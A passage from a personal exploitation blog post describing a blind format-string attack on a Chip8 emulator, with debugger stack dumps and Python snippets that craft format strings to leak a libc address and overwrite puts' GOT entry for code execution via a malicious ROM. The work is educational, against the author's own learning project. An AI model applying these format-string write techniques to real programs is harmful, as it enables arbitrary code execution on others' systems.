---
title: Pwning the Chip8 Emulator with Blind Format Strings
description: Continuation of the previous post. I use the built arbitrary call primitive using some blind format string exploitation techniques to achieve RCE.
tags: binary-exploitation format-string
attachments-dir: pwning-the-chip8-emulator-with-blind-format-strings
attachments:
    - filename: exploit.py
---

This is a continuation of my previous post, if you have not read it you can find it [here](https://lucabtz.com/blog/attempt-at-pwning-a-chip8-emulator).

As I was browsing through X I came across this [post](https://www.synacktiv.com/publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from).
When trying to exploit the emulator before I realized I could call `printf` with an arbitrary format string, I also checked 
quickly resources online, but mainly they exploit format string bugs which are not blind (you can see and read the output
of the `printf`). Here the situation is different as the output would be on the terminal of the remote computer which we can't 
read. However, as I saw the above post I realized blind format string exploits are a thing and I decided to investigate whether
they would work here.

For context I reccomend you read the post I linked as well as keep the [man page for printf](https://www.man7.org/linux/man-pages/man3/printf.3.html)
open while you read and refer to it often.

## Blind `printf` exploit

The general idea is using `printf` to first leak a `libc` address into the Chip8 memory. Then we process this using the Chip8's
assembly to compute the address of `system`. Finally we use `printf` again to overwrite the GOT entry of `puts` and we have
arbitrary code execution.

First step is placing a pointer to some Chip8 memory onto the stack. We will need this because with the format `%n`
(which is the only writing primitive in format strings) we can write only to pointers which are on the stack.

I decided to use address `0x405220` which corresponds to the VM address `0x100`. This is what the stack looks like at a `printf` call
```
pwndbg> stack 15
00:0000│ rsp 0x7ffdd9892408 —▸ 0x7fa214d6be59 (Mix_FadeInMusicPos+265) ◂— mov ebp, eax
01:0008│     0x7ffdd9892410 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
02:0010│     0x7ffdd9892418 —▸ 0x7ffdd9892450 ◂— 2
03:0018│     0x7ffdd9892420 —▸ 0x7fa214fcd000 (_rtld_global) —▸ 0x7fa214fce2e0 ◂— 0
04:0020│     0x7ffdd9892428 —▸ 0x4013fd (main+295) ◂— movzx eax, byte ptr [rip + 0x5556]
05:0028│     0x7ffdd9892430 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
06:0030│     0x7ffdd9892438 ◂— 0x254442d18
07:0038│     0x7ffdd9892440 ◂— 0x3fe0000000000000
08:0040│     0x7ffdd9892448 ◂— 0xb00000000
09:0048│     0x7ffdd9892450 ◂— 2
0a:0050│     0x7ffdd9892458 —▸ 0x7fa214b91dba (__libc_start_call_main+122) ◂— mov edi, eax
0b:0058│     0x7ffdd9892460 ◂— 0x3ada368abac064c3
0c:0060│     0x7ffdd9892468 —▸ 0x4012d6 (main) ◂— push rbp
0d:0068│     0x7ffdd9892470 ◂— 0x2bac064c3
0e:0070│     0x7ffdd9892478 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
```
I decided to write the address `0x405220` at the stack address `0x7ffdd9892568`, which is as you can see, where the program name
is stored on the stack. To do so I used to following code
```py
    asm.write_bytes(0x0, b"%" + str(PRINTF_LEAK_ADDR).encode("ascii") + b"c%6$ln\x00")
    asm.native_call_primitive(PRINTF_PLT)
```
Here `PRINTF_LEAK_ADDR` is `0x405220`. In particular the format stores the value `0x405220` into the character counter and then
dumps it using the `%ln` format with the appropriate argument index.

Now that we have the address we want to write too we can leak there some `libc` address. In particular we have the address of
`__libc_start_call_main+122`, `0x7fa214b91dba`, on the stack. To leak this we need to use first the format `%*15$c` which
reads the argument with index 15 into the character counter. In particular the `*15$` part says that the 15th argument, which
is supposed to be an `int`, stores the value that need to be used as the field width (refer to the man pages for details).
This is precisely the argument index of the `__libc_start_call_main+122` address.
Unfortunately, we do not control the type here, the value is interpreted as `int`, so we can only read the lower 32 bits. However 
this will prove sufficient, because we will just overwrite the lower 32 bits of the GOT entry of `puts`.
Further it is a signed `int` which will lead to some weirdness when the MSB of the lower 32 bits is set
(whether this is set or not depends on ASLR, so it is random).

Now that we read the value we dump it into the chip8's memory at `0x405220` using the format `%49$ln`. So the final code looks
like
```py
    asm.write_bytes(0x0, b"%*15$c%49$ln\x00")
    asm.native_call_primitive(PRINTF_PLT)
```

Now let me go back to the problem with signed `int`s. For example let me take the case where `__libc_start_call_main+122` is
`0x7ffff7bc1dba`. The lower 32 bits are `0xf7bc1dba` and thus have the sign bit set. In this case what gets written at the
leak location is the value `0x0843e246`. However after some thinking about this and how the `printf` code may work (I did not 
actually read the code) I realized that we always have `actual_lower_32_bits + leak_value = 0x100000000` (i.e. the leaked value 
is the two's complement of the real value) so that we can always recover the actual value from the leaked one anyhow. If the
sign bit is not set then the leaked value is just the real value of the lower 32 bits.

So we process the leak as follows:
- look at the page offset of the leaked value (this is independent of ASLR): if it is `0xdba` the leak is the actual value
  and we need to do nothing,
- otherwise compute the actual value by getting the two's complement.

After implementing this in the chip8's instructions, we add the offset to `system` to the leak with more instructions. 
Then we can leverage `printf` again to overwrite the lower 32-bits of some GOT entry (let me chose `puts` which is at
address `0x405038`). To keep the previous setup in place I write this to a different stack location with format strings.
```
pwndbg> stack 15
00:0000│ rsp 0x7ffc39a50a00 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
01:0008│-038 0x7ffc39a50a08 —▸ 0x7ffc39a50a40 —▸ 0x405038 (puts@got[plt]) —▸ 0x7ff7b0eb8e60 (puts) ◂— push r14
02:0010│-030 0x7ffc39a50a10 —▸ 0x7ff7b12a4000 (_rtld_global) —▸ 0x7ff7b12a52e0 ◂— 0
03:0018│-028 0x7ffc39a50a18 —▸ 0x4013fd (main+295) ◂— movzx eax, byte ptr [rip + 0x5556]
04:0020│-020 0x7ffc39a50a20 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
05:0028│-018 0x7ffc39a50a28 ◂— 0x254442d18
06:0030│-010 0x7ffc39a50a30 ◂— 0x3fe0000000000000
07:0038│-008 0x7ffc39a50a38 ◂— 0xb00000000
08:0040│ rbp 0x7ffc39a50a40 —▸ 0x405038 (puts@got[plt]) —▸ 0x7ff7b0eb8e60 (puts) ◂— push r14
09:0048│+008 0x7ffc39a50a48 —▸ 0x7ff7b0e68dba (__libc_start_call_main+122) ◂— mov edi, eax
0a:0050│+010 0x7ffc39a50a50 ◂— 0x3ada368abac064c3
0b:0058│+018 0x7ffc39a50a58 —▸ 0x4012d6 (main) ◂— push rbp
0c:0060│+020 0x7ffc39a50a60 ◂— 0x2bac064c3
0d:0068│+028 0x7ffc39a50a68 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
0e:0070│+030 0x7ffc39a50a70 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
```
As you can see we both have the leak address and the `puts` GOT address somewhere on the stack now.

Now comes the annoying part: we need to generate the format string that will overwrite the GOT entry ourself in the chip8
program. Ideally one would use the format `%<value to write in decimal ascii>c` to load the value in the character counter.
However converting to decimal is not so easy as there is no division operation on the chip8.

What I ended up doing is checking the values bit by bit and adding the format strings `%1$<some power of 2>c`: for example the
binary number `1011` would convert to `%1$1c%1$2c%1$8c`. I also spitted the write in two steps as this seemed to work better
and it also produce smaller format strings, so each time I write only 16 bits using the format `%14$hn` (`14` references the
pointer to `puts@got[plt]` we previously written on the stack). Splitting the write in two also means we need to update the GOT address on the stack
before the second write.

After this is done the exploit is completed using again the arbitrary call primitive to call `puts@plt` with any command we
want to run as first argument.

## Conclusion
The exploit works fully reliably, however, unless the output of the program is piped into `/dev/null` it is extremely slow as
a lot of characters need to actually be printed. This was just a learning project anyhow and I learned a lot about format string
exploits along the way, I hope at the end of this journey you have learned something to, dear reader.
Anyhow here is the exploit code which will generate a malicious ROM that spawns a calculator
